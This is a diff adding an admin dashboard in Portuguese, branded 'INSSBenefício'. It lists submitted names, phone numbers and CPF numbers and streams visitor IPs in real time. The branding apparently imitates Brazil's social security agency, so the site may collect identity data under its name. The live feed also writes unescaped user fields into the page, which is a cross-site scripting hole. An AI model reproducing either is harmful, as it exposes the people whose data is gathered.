@@ -1,0 +1,361 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Admin — INSS</title>
+<link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;600;700;800&family=DM+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0A0F1E;
+  --card:#111827;
+  --card2:#1a2235;
+  --border:#1e2d45;
+  --accent:#1351B4;
+  --green:#22c55e;
+  --yellow:#FFCD07;
+  --red:#ef4444;
+  --text:#f1f5f9;
+  --muted:#64748b;
+  --font:'DM Sans',sans-serif;
+}
+body{font-family:var(--font);background:var(--bg);color:var(--text);min-height:100vh;font-size:.9rem}
+
+/* ── HEADER ── */
+.topbar{
+  background:var(--card);
+  border-bottom:1px solid var(--border);
+  padding:14px 24px;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  position:sticky;top:0;z-index:100;
+}
+.topbar-left{display:flex;align-items:center;gap:12px}
+.topbar h1{font-family:'Sora',sans-serif;font-size:1.05rem;font-weight:700;color:#fff}
+.topbar h1 span{color:var(--yellow)}
+.live-dot{
+  width:10px;height:10px;background:var(--green);border-radius:50%;
+  animation:livepulse 1.5s ease-in-out infinite;
+  box-shadow:0 0 0 0 rgba(34,197,94,.7);
+}
+@keyframes livepulse{
+  0%{box-shadow:0 0 0 0 rgba(34,197,94,.7)}
+  70%{box-shadow:0 0 0 8px rgba(34,197,94,0)}
+  100%{box-shadow:0 0 0 0 rgba(34,197,94,0)}
+}
+.status-text{font-size:.78rem;color:var(--green);font-weight:600}
+.btn-refresh{
+  background:var(--accent);color:#fff;border:none;padding:7px 16px;
+  border-radius:6px;font-size:.8rem;font-weight:600;cursor:pointer;
+  transition:opacity .2s;font-family:var(--font);
+}
+.btn-refresh:hover{opacity:.85}
+
+/* ── LAYOUT ── */
+.page{max-width:1280px;margin-inline:auto;padding:24px 20px}
+
+/* ── STATS ── */
+.stats-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:24px}
+.stat-card{
+  background:var(--card);border:1px solid var(--border);border-radius:12px;
+  padding:20px;position:relative;overflow:hidden;
+}
+.stat-card::before{
+  content:'';position:absolute;top:0;left:0;right:0;height:3px;
+  background:var(--c,var(--accent));
+}
+.stat-card.green{--c:var(--green)}
+.stat-card.yellow{--c:var(--yellow)}
+.stat-card.red{--c:var(--red)}
+.stat-label{font-size:.72rem;font-weight:600;letter-spacing:.08em;text-transform:uppercase;color:var(--muted);margin-bottom:8px}
+.stat-val{font-family:'Sora',sans-serif;font-size:2rem;font-weight:800;color:#fff;line-height:1;font-variant-numeric:tabular-nums}
+.stat-sub{font-size:.72rem;color:var(--muted);margin-top:6px}
+
+/* ── GRID PRINCIPAL ── */
+.main-grid{display:grid;grid-template-columns:1fr 340px;gap:16px;align-items:start}
+
+/* ── TABELA ── */
+.panel{background:var(--card);border:1px solid var(--border);border-radius:12px;overflow:hidden}
+.panel-header{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:16px 20px;border-bottom:1px solid var(--border);
+}
+.panel-title{font-family:'Sora',sans-serif;font-size:.9rem;font-weight:700;color:#fff}
+.badge-count{
+  background:var(--accent);color:#fff;font-size:.7rem;font-weight:700;
+  padding:2px 8px;border-radius:100px;
+}
+
+.tbl-wrap{overflow-x:auto}
+table{width:100%;border-collapse:collapse}
+th{
+  font-size:.7rem;font-weight:700;letter-spacing:.08em;text-transform:uppercase;
+  color:var(--muted);padding:10px 14px;text-align:left;
+  border-bottom:1px solid var(--border);white-space:nowrap;
+}
+td{
+  padding:12px 14px;border-bottom:1px solid rgba(30,45,69,.5);
+  font-size:.82rem;color:var(--text);vertical-align:top;
+}
+tr:last-child td{border-bottom:none}
+tr:hover td{background:rgba(255,255,255,.02)}
+.new-row td{animation:rowfade .8s ease}
+@keyframes rowfade{from{background:rgba(19,81,180,.25)}}
+
+.tag{
+  display:inline-block;padding:2px 8px;border-radius:4px;font-size:.68rem;font-weight:600;
+  background:rgba(19,81,180,.15);color:#7AAAF5;white-space:nowrap;
+}
+.empty{text-align:center;padding:40px;color:var(--muted);font-size:.85rem}
+
+/* ── FEED DE VISITAS ── */
+.feed{height:460px;overflow-y:auto;padding:12px}
+.feed::-webkit-scrollbar{width:4px}
+.feed::-webkit-scrollbar-track{background:transparent}
+.feed::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
+
+.feed-item{
+  background:var(--card2);border:1px solid var(--border);border-radius:8px;
+  padding:10px 12px;margin-bottom:8px;font-size:.78rem;
+  animation:feedin .4s ease;
+}
+@keyframes feedin{from{opacity:0;transform:translateY(-8px)}}
+.feed-item .fi-time{color:var(--muted);font-size:.7rem;float:right}
+.feed-item .fi-page{color:var(--yellow);font-weight:600;margin-top:2px}
+.feed-item .fi-ip{color:var(--muted)}
+.feed-cad{border-left:3px solid var(--green) !important}
+.feed-vis{border-left:3px solid var(--accent) !important}
+
+.feed-empty{text-align:center;padding:32px 0;color:var(--muted);font-size:.82rem}
+
+/* ── RESPONSIVE ── */
+@media(max-width:900px){
+  .stats-grid{grid-template-columns:1fr 1fr}
+  .main-grid{grid-template-columns:1fr}
+}
+@media(max-width:480px){
+  .stats-grid{grid-template-columns:1fr 1fr}
+}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="topbar-left">
+    <div class="live-dot"></div>
+    <h1>INSS<span>Benefício</span> — Painel Admin</h1>
+    <span class="status-text" id="statusText">Conectando…</span>
+  </div>
+  <div style="display:flex;gap:8px;align-items:center">
+    <span id="adminUser" style="font-size:.75rem;color:#64748b"></span>
+    <button class="btn-refresh" onclick="carregar()">↻ Atualizar</button>
+    <button class="btn-refresh" style="background:#374151" onclick="sair()">Sair</button>
+  </div>
+</div>
+
+<div class="page">
+
+  <!-- STATS -->
+  <div class="stats-grid">
+    <div class="stat-card">
+      <div class="stat-label">Visitas hoje</div>
+      <div class="stat-val" id="sVH">—</div>
+      <div class="stat-sub">acessos no dia</div>
+    </div>
+    <div class="stat-card green">
+      <div class="stat-label">Total de visitas</div>
+      <div class="stat-val" id="sVT">—</div>
+      <div class="stat-sub">desde o início</div>
+    </div>
+    <div class="stat-card yellow">
+      <div class="stat-label">Cadastros hoje</div>
+      <div class="stat-val" id="sCH">—</div>
+      <div class="stat-sub">formulários enviados</div>
+    </div>
+    <div class="stat-card red">
+      <div class="stat-label">Total de cadastros</div>
+      <div class="stat-val" id="sCT">—</div>
+      <div class="stat-sub">desde o início</div>
+    </div>
+  </div>
+
+  <!-- MAIN GRID -->
+  <div class="main-grid">
+
+    <!-- TABELA CADASTROS -->
+    <div class="panel">
+      <div class="panel-header">
+        <span class="panel-title">Cadastros recebidos</span>
+        <span class="badge-count" id="badgeCount">0</span>
+      </div>
+      <div class="tbl-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Nome</th>
+              <th>Telefone</th>
+              <th>CPF</th>
+              <th>Tipo</th>
+              <th>Mensagem</th>
+              <th>Data/Hora</th>
+            </tr>
+          </thead>
+          <tbody id="tabelaCads">
+            <tr><td colspan="7" class="empty">Carregando…</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- FEED TEMPO REAL -->
+    <div class="panel">
+      <div class="panel-header">
+        <span class="panel-title">Atividade em tempo real</span>
+        <div class="live-dot"></div>
+      </div>
+      <div class="feed" id="feed">
+        <div class="feed-empty">Aguardando atividade…</div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+const feed = document.getElementById('feed');
+let feedVazio = true;
+
+function addFeedItem(tipo, dados) {
+  if (feedVazio) { feed.innerHTML = ''; feedVazio = false; }
+  const el = document.createElement('div');
+  el.className = 'feed-item ' + (tipo === 'cadastro' ? 'feed-cad' : 'feed-vis');
+  const hora = dados.criado_em ? dados.criado_em.split(' ')[1] : new Date().toLocaleTimeString('pt-BR');
+  if (tipo === 'cadastro') {
+    el.innerHTML = `<span class="fi-time">${hora}</span>
+      <strong style="color:#22c55e">✦ Novo cadastro</strong>
+      <div style="margin-top:4px"><strong>${dados.nome || '—'}</strong></div>
+      <div class="fi-ip">${dados.telefone || ''} ${dados.cpf ? '· CPF: '+dados.cpf : ''}</div>
+      <div class="fi-page">${dados.tipo || ''}</div>`;
+  } else if (tipo === 'visita') {
+    el.innerHTML = `<span class="fi-time">${hora}</span>
+      <span style="color:#7AAAF5">● Visita</span>
+      <div class="fi-page">${dados.pagina || '/'}</div>
+      <div class="fi-ip">IP: ${dados.ip || '?'}</div>`;
+  }
+  feed.insertBefore(el, feed.firstChild);
+  // Mantém máx 60 itens
+  while (feed.children.length > 60) feed.removeChild(feed.lastChild);
+}
+
+function renderTabela(cads) {
+  const tbody = document.getElementById('tabelaCads');
+  document.getElementById('badgeCount').textContent = cads.length;
+  if (!cads.length) {
+    tbody.innerHTML = '<tr><td colspan="7" class="empty">Nenhum cadastro ainda.</td></tr>';
+    return;
+  }
+  tbody.innerHTML = cads.map(c => `
+    <tr>
+      <td style="color:var(--muted)">${c.id}</td>
+      <td><strong>${esc(c.nome)}</strong></td>
+      <td>${esc(c.telefone)}</td>
+      <td style="color:var(--muted);font-size:.75rem">${esc(c.cpf)}</td>
+      <td><span class="tag">${esc(c.tipo)}</span></td>
+      <td style="max-width:180px;color:var(--muted);font-size:.78rem">${esc(c.mensagem).slice(0,80)}</td>
+      <td style="color:var(--muted);font-size:.75rem;white-space:nowrap">${esc(c.criado_em)}</td>
+    </tr>`).join('');
+}
+
+function renderStats(s) {
+  document.getElementById('sVH').textContent = s.visitas_hoje;
+  document.getElementById('sVT').textContent = s.total_visitas;
+  document.getElementById('sCH').textContent = s.cadastros_hoje;
+  document.getElementById('sCT').textContent = s.total_cadastros;
+}
+
+function esc(s) {
+  return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+async function carregar() {
+  try {
+    const r = await fetch('/api/admin/dados');
+    const d = await r.json();
+    renderTabela(d.cadastros || []);
+    renderStats(d.stats || {});
+    (d.visitas_recentes || []).slice().reverse().forEach(v =>
+      addFeedItem('visita', v));
+  } catch(e) { console.error(e); }
+}
+
+// SSE
+function conectarSSE() {
+  const es = new EventSource('/api/stream');
+  es.onopen = () => {
+    document.getElementById('statusText').textContent = 'Ao vivo';
+    document.getElementById('statusText').style.color = 'var(--green)';
+  };
+  es.onmessage = e => {
+    try {
+      const msg = JSON.parse(e.data);
+      if (msg.type === 'cadastro') {
+        addFeedItem('cadastro', msg.data);
+        // Adiciona linha nova no topo da tabela
+        const tbody = document.getElementById('tabelaCads');
+        const d = msg.data;
+        const tr = document.createElement('tr');
+        tr.className = 'new-row';
+        tr.innerHTML = `
+          <td style="color:var(--muted)">${d.id}</td>
+          <td><strong>${esc(d.nome)}</strong></td>
+          <td>${esc(d.telefone)}</td>
+          <td style="color:var(--muted);font-size:.75rem">${esc(d.cpf)}</td>
+          <td><span class="tag">${esc(d.tipo)}</span></td>
+          <td style="max-width:180px;color:var(--muted);font-size:.78rem">${esc(d.mensagem).slice(0,80)}</td>
+          <td style="color:var(--muted);font-size:.75rem;white-space:nowrap">${esc(d.criado_em)}</td>`;
+        // Remove "nenhum cadastro" se existir
+        if (tbody.querySelector('.empty')) tbody.innerHTML = '';
+        tbody.insertBefore(tr, tbody.firstChild);
+        // Atualiza badge
+        const badge = document.getElementById('badgeCount');
+        badge.textContent = parseInt(badge.textContent||0) + 1;
+        // Stats
+        document.getElementById('sCH').textContent = parseInt(document.getElementById('sCH').textContent||0) + 1;
+        document.getElementById('sCT').textContent = parseInt(document.getElementById('sCT').textContent||0) + 1;
+      } else if (msg.type === 'visita') {
+        addFeedItem('visita', msg.data);
+        if (msg.data.hoje !== undefined)  document.getElementById('sVH').textContent = msg.data.hoje;
+        if (msg.data.total !== undefined) document.getElementById('sVT').textContent = msg.data.total;
+      }
+    } catch {}
+  };
+  es.onerror = () => {
+    document.getElementById('statusText').textContent = 'Reconectando…';
+    document.getElementById('statusText').style.color = '#f59e0b';
+    setTimeout(conectarSSE, 3000);
+    es.close();
+  };
+}
+
+async function sair() {
+  await fetch('/api/logout', {method:'POST'});
+  window.location.href = '/login';
+}
+
+// Verifica sessão
+fetch('/api/me').then(r => {
+  if (!r.ok) window.location.href = '/login';
+  return r.json();
+}).then(d => {
+  if (!d.ok) window.location.href = '/login';
+  else document.getElementById('adminUser').textContent = '👤 ' + d.user;
+}).catch(() => window.location.href = '/login');
+
+carregar();
+conectarSSE();
+</script>
+</body>
+</html>
